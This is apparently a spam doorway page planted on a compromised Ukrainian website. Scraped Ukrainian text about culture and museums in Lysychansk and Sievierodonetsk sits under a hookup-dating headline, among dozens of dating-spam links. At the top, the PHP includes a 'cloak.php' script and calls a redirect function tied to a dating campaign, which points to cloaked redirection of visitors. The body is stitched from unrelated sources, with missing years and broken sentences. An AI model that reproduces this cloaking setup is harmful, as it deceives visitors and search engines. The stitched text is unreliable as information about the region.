<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bd%d0%b0%d0%b9%d0%ba%d1%80%d0%b0%d1%89%d1%96+%d0%bc%d1%96%d1%81%d1%86%d1%8f%2c+%d0%b4%d0%b5+%d0%bc%d0%be%d0%b6%d0%bd%d0%b0+%d0%bf%d1%96%d0%b4%d0%ba%d0%bb%d1%8e%d1%87%d0%b8%d1%82%d0%b8%d1%81%d1%8c+%d0%9b%d0%b8%d1%81%d0%b8%d1%87%d0%b0%d0%bd%d1%81%d1%8c%d0%ba+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Лисичанськ</title>
	<meta name="description" content="Відповідно до моніторингу створення нових робочих місць, згідно з Методикою, затвердженою наказом Міністерства соціальної політики України від " />
	<link rel="canonical" href="https://masage.od.ua/img/237/kekiz-naykrash-mstsya.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/467/ce-hvilinn-pobachennya-v.php">хвилинні побачення в Болград Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/361/hefo-znayomstva-bezkoshtovno-v.php">знайомства безкоштовно в Кременчук Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/paha-msto-pdklyuchiti-v.php">місто підключити в Білгород-Дністровський Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Найкращі місця, де можна підключитись Лисичанськ Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Євген Королетов , 30 років, художник Хочете побачити більше? Дивіться наш документальний репортаж та підписуйтесь на наш канал YouTube. Сєвєродонецьк розташований за 60 кілометрів від лінії розмежування.</p>
		
			
				<div>У Лисичанську намалювали мурал</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/yl-vPdwfsNY' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>З го став новим центром Луганської області. За його відчуттями, Сєвєродонецьк чимось схожий на Луганськ: «В Луганську приблизно те ж саме було: якщо хочу послухати якусь нову музику або влаштувати якийсь захід, то все це повинен організувати сам. Тому що шансів, що це зробить хтось інший, дуже мало. Тепер я в Сєвєродонецьку намагаюся знайти свій Луганськ».</p>
<p>Разом з друзями Євген створив громадську організацію «Тумблер» одна зі співзасновниць — Найля Ібрагімова, ми розповідали про неї в репортажі «Кларнет Юргена». Вона працює переважно з переселенцями, намагаючись допомогти людям з посттравматичним синдромом за допомогою соціокультурних і художніх практик. Одне з найпомітніших досягнень команди «Тумблера» — молодіжний фестиваль «32 травня». Його провели в містечку Щастя, яке розташоване практично на лінії розмежування. У Щасті регулярно чути вибухи, часом сюди прилітають снаряди.</p>
<p>В цьому смт є тільки будинок культури, не завжди відкритий, і покинутий «агітаційний майданчик». На створення спеціальної конструкції, яку розробив Королетов, і на інші фестивальні витрати скинулись приблизно сто людей, до яких команда звернулася через соцмережі.</p><img src="https://find-way.com.ua/images/easyblog_articles/139/b2ap3_large__DSC2099.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>Натисни, аби перейти у групу. А ще, в му, Королетов з друзями провели в Сєвєродонецьку перший рейв. Для регіону це стало найгучнішою подією, хоч і на сам рейв прийшло небагато людей. Більшість луганців навіть не знають, що це таке. Розквіт рейвів і техно-руху в Україні збігся з військовими діями. Думаю, це пов'язано. Ти ж постійно живеш в стані тривоги, дискомфорту. Хоч тут і не стріляють, але все одно постійно про це щось нагадує.</p>
<p>Військові машини, патрулі, блокпости. Це впливає на твоє життя А рейв дає можливість позбутися стресу в форматі такого колективного трансу. Тут це необхідно». Наприклад, недавно частина команди і місцеві активісти змогли створити крихітний хаб з переробки пластику. Королетов розповідає, що все почалося з ініціативи школяра з сусіднього Лисичанська, який придумав бізнес-проект і отримав на нього гроші.</p>
<p>Хлопці зібрали два верстати для переробки та зробили майстерню в гаражі на околиці Сєвєродонецька.</p><a id='f1'></a><h3>Навігаційне меню</h3><p>Тепер тут навчаються працювати з ресайклінгом. Євген Королетов. Чергова ініціатива Королетова — неформальне угруповання «Луганська Контемпорарі Діаспора». Це об'єднання художників, які живуть на окупованих територіях Луганщини або виїхали на підконтрольну Україні територію.</p>
		
			<br><ul>
			
				<li>Бої за Лисичанськ — Вікіпедія.</li>
			
				<li>Лисичанськ — Вікіпедія.</li>
			
				<li>Лисичанськ | Визначні пам'ятки Лисичанська, музеї, готелі;</li>
			
				<li>компанія знайомств Володимир-Волинський Україна.</li>
			
			</ul>
		
	<p>Об'єднання замислювалося як мережа творчих особистостей, які поділяють цінності ЛКД і працюють в тому чи іншому вигляді з темою війни. Хочете побачити більше? У цього руху ще в році навіть з'явилося своє медіа — журнал Golden Coal «Золоте вугіллячко» , присвячений сучасним андеґраундним художникам з Луганська і Донецька. Але нам важливо зберегти зв'язок з друзями, які залишаються на «тому» боці. Ми, наприклад, цікавимося тим, що відбувається з луганським мистецтвом, запитуємо себе: чи є луганське мистецтво зараз українським, або чи було луганське російськомовне довоєнне мистецтво українським?</p><strong><a id='f2'></a><h2>Військово-цивільна адміністрація міста Лисичанськ Луганської області - Новини</h2></strong><p>Це складні питання, але нам цікаво шукати відповіді на них». Атипова бібліотека. Старобільськ — маленьке містечко на 16 тисяч жителів на півночі Луганської області. Ані окупація, ані війна його не торкнулися. Проте влітку го сюди переїхало кілька обласних інституцій, наприклад, — обласний краєзнавчий музей і обласний аграрний університет. Атипова бібліотека Старобільськ — маленьке містечко на 16 тисяч жителів на півночі Луганської області. Сергій Летучий , музикант Хочете побачити більше? Сьогодні найцікавіші процеси відбуваються з бібліотекою. Вона теж переїхала з Луганська.</p>
<p>Більшість співробітників перебралися в Старобільськ і отримали невелике приміщення, а місцевий музикант і активіст Сергій Летучий зайнявся перетворенням бібліотеки в культурну і освітню платформу, яка об'єднує найрізноманітніших мешканців міста. Вона йому: «А чому ти мені тикаєш? Мені 76 років! Сергій Летучий — гітарист групи Flying Swan, співавтор графіті-ініціативи «Бетон Арт», співробітник бібліотеки і просто молода людина. З інвалідністю. Він живе в Старобільську від самого народження. З ти пересувається переважно на візку. Це досить непросте випробування, каже він, бути інвалідом в такому місті: ніхто не встановлює пандуси, ніхто не дбає про інклюзивність просторів.</p>
<p>Луганська універсальна наукова бібліотека, вона ж Good Library брендинг зробила теж команда Летучого — це простір для всіх. Удень тут можна зустріти і пенсіонерів, які вивчають книги, передані в бібліотечний фонд сотнями різних людей зі всієї України, і підлітків, що рубаються в «Доту». Сьогодні Лисичанськ - великий промисловий та індустріальний центр східної частини України.</p>
<p>Культурні традиції та історичні події життя міста знайшли відображення в експозиціях міських музеїв і виставок. Експозиції краєзнавчого музею розповідають про заснування Лисичанська, історію вуглевидобутку на Донбасі, етнографічні традиції регіону та про участь жителів міста у Великій Вітчизняній війні. Тут можна побачити реконструкцію поховання, якому близько п'яти тисяч років, відтворену за допомогою артефактів, знайдених археологами в околицях міста.</p>
<p>Експозиції літературного музею ім.</p><strong><a id='f3'></a><h2>Бої за Лисичанськ</h2></strong><p>Сосюри присвячені творчості українського поета, його життєвому і творчому шляху, тут представлені особисті речі поета В. Сосюри, фотографії, рукописи, книги. На базі музею проводяться літературні свята, читання та уроки літератури. Крім того, в місті діє музей історії розвитку вугільної промисловості Лисичанського вугільного району та історичні музеї промислових підприємств міста.</p>
		
			<br><ul>
			
				<li>50 + швидкісні знайомства в Гребінка Україна.</li>
			
				<li>.</li>
			
				<li>чоловічі побачення Курахове Україна;</li>
			
				<li>Культура, музеї та театри Лисичанська?</li>
			
			</ul>
		
	<p>У Лисичанську розташовані такі культурні заклади, як міські палаци та будинки культури, які є місцем проведення творчих фестивалів, головних міських культурних та громадських заходів. Лисичанськ - одне з найстаріших міст Донбасу, історія міста втілилася в збережених до наших днів історичних та архітектурних пам'ятках різних епох.</p>
<p>До визначних пам'яток церковної архітектури міста відносяться: Свято-Митрофанівський храм , Свято-Миколаївський собор , Переїзнянська церква та ін. У Лисичанську знаходиться велика кількість пам'яток монументальної архітектури, присвячених різним історичним подіям, найбільш відомими з яких є: пам'ятник засновнику міста і рудознатцу Григорію Капустіну, пам'ятний знак першій шахті в Донбасі, меморіальний комплекс Великої Вітчизняної війни "Привольнянский плацдарм", історико-меморіальний комплекс "Пам'ять", пам'ятник маршалу К. Ворошилову, пам'ятник лисичанам-льотчикам Великої Вітчизняної війни, меморіальний комплекс захисникам і визволителям Лисичанська "Танк Т", пам'ятник поетові В.</p>
<p>Сосюрі, пам'ятний знак річчя Донбасу, пам'ятник на честь лисичан-афганців, пам'ятник землякам чорнобильцям та ін. На високому березі річки Сіверський Донець, з якого відкривається погляду велична панорама міста, розташована скульптурна композиція "Олень", що стала одним з впізнаваних місць Лисичанська.</p>
		
			<br><ul>
			
				<li>ніч швидкісних побачень в Вовчанськ Україна.</li>
			
				<li>Історія міста!</li>
			
				<li>мережа знайомств Ялта Україна;</li>
			
				<li>швидкісні побачення більше 40 Сніжне Україна.</li>
			
			</ul>
		
	<p>Біля будівлі колишньої штейгерської школи, нині Лисичанський гірничо-індустріальний коледж, знаходяться дві кам'яні статуї - половецькі кам'яні баби, що відносяться до половецьких старожитностей ХІІ століття н. Серед улюблених місць відпочинку городян і гостей міста слід відзначити: озеро Клешня і зону відпочинку біля нього, міський парк "Водна станція", Гресівський парк культури і відпочинку, до місцевих природних пам'яток відноситься Конгресів Яр Гельмерсенів Яр , що є геологічним пам'ятником.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/249/noti-sayti-znayomstv-bezkoshtovno.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/133/nozep-sayti-znayomstv-z.php">сайти знайомств з людьми в Миколаїв Україна</a></li><li><a href="https://masage.od.ua/img/422/byp-vash-sayt-znayomstv.php">ваш сайт знайомств у Кривий Ріг Україна</a></li><li><a href="https://masage.od.ua/img/103/joj-znayomstvo-z.php">знайомство з життя в Броди Україна</a></li><li><a href="https://masage.od.ua/img/280/jiqe-bezkoshtovn-hristiyansk-znayomstva.php">безкоштовні християнські знайомства Умань Україна</a></li><li><a href="https://masage.od.ua/img/398/kyrug-naykrashe-mstse-pdklyuchiti.php">найкраще місце підключити Керч Україна</a></li><li><a href="https://masage.od.ua/img/237/conu-pdklyuchiti-sayti.php">підключити сайти в Підгородне Україна</a></li><li><a href="https://masage.od.ua/img/422/kefo-odna-nch-pdklyuchennya.php">одна ніч підключення в Хрестівка Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#f1'>Навігаційне меню</a></li>
<li><a href='#f2'>Військово-цивільна адміністрація міста Лисичанськ Луганської області - Новини</a></li>
<li><a href='#f3'>Бої за Лисичанськ</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/137/vebi-znayomstva-z-cholovkami.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>